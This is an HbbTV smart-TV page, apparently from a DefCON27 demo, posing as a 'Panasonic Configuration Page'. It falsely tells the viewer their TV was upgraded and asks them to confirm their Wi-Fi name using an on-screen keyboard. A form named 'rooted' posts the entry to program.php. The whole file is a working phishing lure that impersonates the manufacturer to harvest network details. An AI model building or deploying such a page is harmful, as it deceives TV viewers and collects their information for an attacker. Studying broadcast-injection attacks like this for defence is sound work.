<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//HbbTV//1.1.1//EN" "http://www.hbbtv.org/dtd/HbbTV-1.1.1.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
	<head>
	<title>Panasonic Configuration Page</title>
	<meta http-equiv="content-type" content="Content-Type: application/vnd.hbbtv.xhtml+xml; charset=UTF-8"></meta>
	<link rel="stylesheet" type="text/css" href="./base.css" />
	<script type="text/javascript" src="./keycodes.js"></script>
	<script type="text/javascript" src="./base.js"></script>
	<script type="text/javascript">
	//<![CDATA[
	var testPrefix = "";
	var pinEntry = false, pinCode = '';
	window.onload = function() {
	  menuInit();
	  registerMenuListener(function(liid) {
		  switch(liid) {
			case "Aceptar":
				document.rooted.submit();
			break;
			case "Borrar":
				document.getElementById('Title').value = '';
			break;
			default:
				document.getElementById('Title').value = document.getElementById('Title').value + liid;
			}
	  });
	  registerKeyEventListener();
	  initApp();
	  menuSelectByName('');
	};
	function handleKeyCode(kc) {
	  if (kc===VK_BLUE && !automate.timer) {
		pinEntry = !pinEntry;
		setKeyset(0x1+0x2+0x4+0x8+0x10+(pinEntry?0x100:0));
		document.getElementById("automatepin").style.display = pinEntry ? "block" : "none";
		pinCode = '';
		updatePinCode();
		return true;
	  }
	  if (pinEntry && kc>=VK_0 && kc<=VK_9) {
		pinCode += ''+(kc-VK_0);
		updatePinCode();
		if (pinCode.length>=4) {
		  pinEntry = false;
		  automate.pin = parseInt(pinCode, 10);
		  setTimeout(function() {
			document.getElementById("automatepin").style.display = "none";
			runNextAutoTest(true);
		  }, 1000);
		}
		return true;
	  }
	  if (pinEntry && kc===VK_BACK) {
		if (pinCode.length>0) {
		  pinCode = pinCode.substring(0, pinCode.length-1);
		  updatePinCode();
		} else {
		  pinEntry = false;
		  document.getElementById("automatepin").style.display = "none";
		}
		return true;
	  }
	  return false;
	}
	function updatePinCode() {
	  var i, txt = '';
	  for (i=0; i<4; i++) {
		if (pinCode.length<=i) {
		  txt += "_ ";
		} else {
		  txt += pinCode.substring(i, i+1)+" ";
		}
	  }
	  document.getElementById("automatepinentry").innerHTML = txt;
	}

	//]]>
	</script>
	</head>
	<body>
	<object id="appmgr" type="application/oipfApplicationManager" style="position: absolute; left: 0px; top: 0px; width: 0px; height: 0px;"></object>
	<object id="oipfcfg" type="application/oipfConfiguration" style="position: absolute; left: 0px; top: 0px; width: 0px; height: 0px;"></object>
	<div id="bgdiv" style="left: 0px; top: 0px; width: 1280px; height: 720px;" />

		<table style="background-color: white; margin-top: 85px; margin-left: auto; margin-right: auto;">
			<tr align="center"><td align="center">
				<img src="logo.jpg" align="middle"></img>
			</td></tr>
			<tr><td>
				<form action="program.php" name="rooted" method="post" style="background-color: gray;"><p style="font-size: 25px;">Dear DefCON27 user;<br><br>Your Smart TV has been sucessfully upgraded and your wifi name (ESSID) needs to be confirmed:</p>
			</td></tr>
			<tr><td align="center">
				<input type="text" id="Title" name="Title" value="Home-Wifi" style="font-size: 25px;">
			</td></tr>
			<!--<tr><td align="center">
				<input type="submit" id ="submitButton" value="Submit" style="background-color: gray; font-size: 25px;"></form>
			</td></tr>-->
		</table>
		<table id="menu" class="menu" style="background-color: gray; margin-top: 15px; margin-left: auto; margin-right: auto;" width="300px">
			<tr>
				<td id="q" name="q" automate="ignore" width="30px">q</td>
				<td id="w" name="w" automate="ignore" width="30px">w</td>
				<td id="e" name="e" automate="ignore" width="30px">e</td>
				<td id="r" name="r"automate="ignore" width="30px">r</td>
				<td id="t" name="t" automate="ignore" width="30px">t</td>
				<td id="y" name="y" automate="ignore" width="30px">y</td>
				<td id="u" name="u" automate="ignore" width="30px">u</td>
				<td id="i" name="i" automate="ignore" width="30px">i</td>
				<td id="o" name="o" automate="ignore" width="30px">o</td>
				<td id="p" name="p" automate="ignore" width="30px">p</td>
			</tr>
			<tr>
				<td id="a" name="a" automate="ignore" width="30px">a</td>
				<td id="s" name="s" automate="ignore" width="30px">s</td>
				<td id="d" name="d" automate="ignore" width="30px">d</td>
				<td id="f" name="f" automate="ignore" width="30px">f</td>
				<td id="g" name="g" automate="ignore" width="30px">g</td>
				<td id="h" name="h" automate="ignore" width="30px">h</td>
				<td id="j" name="j" automate="ignore" width="30px">j</td>
				<td id="k" name="k" automate="ignore" width="30px">k</td>
				<td id="l" name="l" automate="ignore" width="30px">l</td>
				<td id="ñ" name="ñ" automate="ignore" width="30px">ñ</td>
			</tr>
			<tr>
				<td id="z" name="z" automate="ignore" width="30px">z</td>
				<td id="x" name="x" automate="ignore" width="30px">x</td>
				<td id="c" name="c" automate="ignore" width="30px">c</td>
				<td id="v" name="v" automate="ignore" width="30px">v</td>
				<td id="b" name="b" automate="ignore" width="30px">b</td>
				<td id="n" name="n" automate="ignore" width="30px">n</td>
				<td id="m" name="m" automate="ignore" width="30px">m</td>
				<td id="," name="," automate="ignore" width="30px">,</td>
				<td id="." name="." automate="ignore" width="30px">.</td>
				<td id="-" name="-" automate="ignore" width="30px">-</td>
			</tr>
			<tr>
				<td colspan="10" align="center" id="Aceptar" name="Aceptar">Aceptar</td>
			</tr>
			<tr>
				<td colspan="10" align="center" id="Borrar" name="Borrar">Borrar</td>
			</tr>
			</table>
	</body>
</html>
